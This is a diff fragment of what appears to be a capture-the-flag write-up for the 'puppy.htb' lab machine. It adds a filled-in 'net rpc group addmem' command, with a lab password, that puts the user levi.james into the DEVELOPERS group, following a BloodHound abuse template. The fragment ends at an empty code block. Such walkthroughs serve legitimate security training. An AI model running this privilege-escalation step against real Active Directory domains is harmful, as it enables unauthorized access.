@@ -182,7 +182,11 @@ So the given command in linux abuse side of bloodhound is of net rpc
 ```bash
 net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
 ```
-So our final 
+So our final command will look like this
 ```bash
 net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
+```
+Now lets verify if the user is added to the DEVS group
+```
+
 ```
